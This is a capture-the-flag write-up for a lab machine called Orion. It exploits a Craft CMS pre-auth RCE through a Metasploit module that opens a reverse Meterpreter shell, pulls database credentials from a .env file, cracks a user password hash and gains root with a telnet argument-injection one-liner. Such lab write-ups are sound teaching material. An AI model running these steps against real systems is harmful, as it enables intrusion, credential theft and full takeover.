# Orion (Easy | Linux) — Write-up

## Reconnaissance

We begin with a standard port scan to identify exposed services:

```bash
nmap <IP_ADDRESS>
```

Result:

```text
22/tcp open  ssh
80/tcp open  http
```

Two services are available:

* **SSH (22)**
* **HTTP (80)**

To properly resolve the target hostname, add the machine to the local hosts file:

```bash
sudo nano /etc/hosts
```

Add:

```text
<IP_ADDRESS> orion.htb
```

Then browse to:

```text
http://orion.htb
```

---

## Web Enumeration

To discover additional endpoints, run:

```bash
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt \
-u http://orion.htb/FUZZ -ac
```

Discovered paths:

```text
/admin
/assets
/index
/logout
```

Observations:

* `/admin` → login page
* `/assets` → access forbidden
* `/index` → main website
* `/logout`

Inspecting the application reveals that it is running:

```text
Craft CMS 5.6.16
```

This version appears vulnerable to:

```text
CVE-2025-32432
```

---

## Initial Access — Craft CMS RCE

A public Metasploit module is available for this vulnerability.

Start Metasploit:

```bash
msfconsole
```

Load and configure the module:

```text
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

set RHOSTS http://orion.htb
set LHOST <YOUR_MACHINE_IP>
set LPORT 80

exploit
```

After successful exploitation, a Meterpreter session is obtained.

Spawn an interactive shell:

```bash
meterpreter> shell

script /dev/null -c /bin/bash
```

This provides a more stable shell as:

```text
www-data
```

---

## Internal Enumeration

Search for sensitive configuration files:

```bash
find / -name ".env" 2>/dev/null
```

The `.env` file contains database credentials:

```text
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

---

## Database Access

Connect to MariaDB:

```bash
mysql -u root -p
```

Enter the password:

```text
SuperSecureCraft123Pass!
```

Enumerate the database:

```sql
SHOW DATABASES;

USE orion;

SHOW TABLES;

SELECT * FROM users;
```

Output:

```text
adam@orion.htb
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

---

## Credential Recovery

Save the hash locally:

```bash
nano hash.txt
```

Crack it using John the Ripper:

```bash
john hash.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
darkangel
```

---

## User Access

Connect via SSH:

```bash
ssh adam@orion.htb
```

Credentials:

```text
Username: adam
Password: darkangel
```

Retrieve the user flag:

```bash
cat ~/user.txt
```

---

# Privilege Escalation

Upload LinPEAS for local enumeration:

```bash
scp linpeas.sh adam@orion.htb:/tmp
```

Execute it:

```bash
cd /tmp

chmod +x linpeas.sh

./linpeas.sh
```

During enumeration, an unexpected service is identified:

```text
Port 23 → Telnet running
```
(Alternatively, the same service could be discovered using `netstat -tulnp`.)

Check the version:

```bash
telnet --version
```

Output:

```text
2.7
```

This version is vulnerable to:

```text
CVE-2026-24061
```

Exploit the vulnerability:

```bash
USER="-f root" telnet -a 127.0.0.1
```

A root shell is obtained.

Retrieve the root flag:

```bash
cat /root/root.txt
```

---

# Conclusion

## Initial Access

* Enumerated HTTP services
* Identified Craft CMS 5.6.16
* Exploited CVE-2025-32432
* Obtained a `www-data` shell

## User Access

* Extracted database credentials from `.env`
* Accessed MariaDB
* Retrieved and cracked user password hash
* Logged in as `adam`

## Privilege Escalation

* Performed local enumeration
* Identified vulnerable Telnet service
* Exploited CVE-2026-24061
* Obtained root access
